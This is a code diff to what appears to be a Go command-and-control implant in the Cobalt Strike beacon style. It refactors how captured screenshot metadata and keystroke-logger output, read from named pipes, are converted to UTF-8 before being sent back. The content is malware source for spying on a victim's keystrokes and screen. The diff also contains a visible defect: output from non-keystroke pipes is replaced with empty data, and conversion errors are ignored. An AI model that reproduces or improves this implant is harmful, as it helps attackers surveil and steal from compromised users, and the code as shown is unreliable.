@@ -277,6 +277,67 @@ func InjectSelf(sh []byte) ([]byte, error) {
 
 }
 
+func convertData2UTF8(buf []byte) ([]byte, error) {
+	buff := bytes.NewBuffer(buf)
+	data, err := util.ParseAnArgLittle(buff)
+	if err != nil {
+		return nil, err
+	}
+	offset := len(buf) - buff.Len()
+
+	UTF8Data, err := CodepageToUTF8(data)
+	if err != nil {
+		return nil, err
+	}
+
+	var retBuf []byte
+	bBytes := make([]byte, 4)
+	binary.LittleEndian.PutUint32(bBytes, uint32(len(UTF8Data)))
+	retBuf = append(retBuf, bBytes...)
+	retBuf = append(retBuf, UTF8Data...)
+	retBuf = append(retBuf, buf[offset:]...)
+
+	return retBuf, nil
+}
+
+func convertWinUser2UTF8(buf []byte) ([]byte, error) {
+	buff := bytes.NewBuffer(buf)
+	_, err := util.ParseAnArgLittle(buff)
+	if err != nil {
+		return nil, err
+	}
+	offset := len(buf) - buff.Len()
+	length := make([]byte, 4)
+	_, err = buff.Read(length)
+	if err != nil {
+		return nil, err
+	}
+
+	windowsName, err := util.ParseAnArgLittle(buff)
+	if err != nil {
+		return nil, err
+	}
+	userName, err := util.ParseAnArgLittle(buff)
+	if err != nil {
+		return nil, err
+	}
+	windowsName, err = CodepageToUTF8(windowsName)
+	if err != nil {
+		ErrorProcess(errors.New("result error"))
+	}
+
+	buf = buf[:offset+4]
+	bBytes := make([]byte, 4)
+	binary.LittleEndian.PutUint32(bBytes, uint32(len(windowsName)))
+	buf = append(buf, bBytes...)
+	buf = append(buf, windowsName...)
+	bBytes = make([]byte, 4)
+	binary.LittleEndian.PutUint32(bBytes, uint32(len(userName)))
+	buf = append(buf, bBytes...)
+	buf = append(buf, userName...)
+	return buf, nil
+}
+
 func HandlerJob(b []byte) ([]byte, error) {
 
 	buf := bytes.NewBuffer(b[4:])
@@ -319,41 +380,11 @@ func HandlerJob(b []byte) ([]byte, error) {
 
 	if result != "" {
 		if callbackType == CALLBACK_SCREENSHOT {
-			resultBytes := []byte(result[4:])
-			buff := bytes.NewBuffer(resultBytes)
-			_, err := util.ParseAnArgLittle(buff)
+			resultBytes, err := convertWinUser2UTF8([]byte(result[4:]))
 			if err != nil {
-				return nil, err
-			}
-			offset := len(resultBytes) - buff.Len()
-			length := make([]byte, 4)
-			_, err = buff.Read(length)
-			if err != nil {
-				return nil, err
+				ErrorProcess(err)
 			}
 
-			windowsName, err := util.ParseAnArgLittle(buff)
-			if err != nil {
-				return nil, err
-			}
-			userName, err := util.ParseAnArgLittle(buff)
-			if err != nil {
-				return nil, err
-			}
-			windowsName, err = CodepageToUTF8(windowsName)
-			if err != nil {
-				ErrorProcess(errors.New("result error"))
-			}
-
-			resultBytes = resultBytes[:offset+4]
-			bBytes := make([]byte, 4)
-			binary.LittleEndian.PutUint32(bBytes, uint32(len(windowsName)))
-			resultBytes = append(resultBytes, bBytes...)
-			resultBytes = append(resultBytes, windowsName...)
-			bBytes = make([]byte, 4)
-			binary.LittleEndian.PutUint32(bBytes, uint32(len(userName)))
-			resultBytes = append(resultBytes, bBytes...)
-			resultBytes = append(resultBytes, userName...)
 			DataProcess(callbackType, resultBytes)
 		} else {
 			DataProcess(callbackType, []byte(result))
@@ -385,11 +416,24 @@ func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string,
 			}
 			break
 		}
+		var send []byte
 		if n > 0 {
-			DataProcess(callbackType, buf[:n])
+			resultBytes := buf[:n]
+			if callbackType == CALLBACK_KEYSTROKES && len(resultBytes) > 4 {
+				send, err = convertWinUser2UTF8(resultBytes)
+				if err != nil {
+					fmt.Printf("convertWinUser2UTF8 error: %v\n", err)
+				}
+				send, err = convertData2UTF8(send)
+				if err != nil {
+					fmt.Printf("convertData2UTF8 error: %v\n", err)
+				}
+			}
+
+			DataProcess(callbackType, send)
 			time.Sleep(time.Millisecond * time.Duration(sleepTime))
 		}
-		result += string(buf[:n])
+		result += string(send)
 	}
 	return result, nil
 }
